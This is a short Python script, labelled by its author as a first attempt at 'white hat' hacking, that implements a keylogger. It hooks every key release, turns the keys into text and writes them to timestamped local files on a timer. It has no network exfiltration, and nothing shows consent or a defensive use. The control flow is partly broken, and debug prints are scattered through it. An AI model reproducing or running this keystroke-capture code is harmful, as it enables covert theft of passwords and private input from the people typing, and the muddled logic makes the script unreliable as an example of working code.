# First Attempt at White Hat Hacking/Cyberscurity Programming
# By Ben Alvaro 
# 03/05/2024




import sys



def keylogger(starter):
    import keyboard #for logging
    from threading import Timer
    from datetime import datetime
    SEND_REPORT_EVERY =  10
    print("Keylogger has started")
    
    global keylogger1
    
    class Keylogger:
        def __init__(self, interval, report_method="file"):
            self.interval = interval
            self.report_method = report_method
            self.log = ""

            self.start_dt = datetime.now()
            self.end_dt = datetime.now()
            
        def callback(self, event):
            name = event.name
            if len(name) > 1:
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            self.log += name

        def update_filename(self):
            start_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":", "")
            end_dt_str = str(self.end_dt)[:-7].replace(" ", "_").replace(":", "")
            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        def report_to_file(self):
            with open(f"{self.filename}.txt", "w") as f:
                print(self.log, file=f)
            print (f"[+] Saved {self.filename}.txt")
            print("Done and dusted")
            keylogger(0)
            raise SystemExit("Exiting keylogger gracefully")
                
            
        def report(self):

            if self.log:
                self.end_dt = datetime.now()
                self.update_filename()
                self.report_to_file()
                self.start_dt = datetime.now()
            self.log = ""
            print("Whats good")
            timer = Timer(interval=self.interval, function=self.report)
            timer.daemon = True
            timer.start()
            

        def start(self):
            counter = 0
            self.start_dt = datetime.now()
            keyboard.on_release(callback=self.callback)
            self.report()
            print(f"{datetime.now()} - Started keylogger")
            keyboard.wait()
    print("Hunky Dory")
    if starter == 1:
        starter = 0
        print(str(starter))
        keylogger1 = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        keylogger1.start()
        
    elif starter == 0:
        print("Lmaoooo")
        quit()
    
print("What's good team")   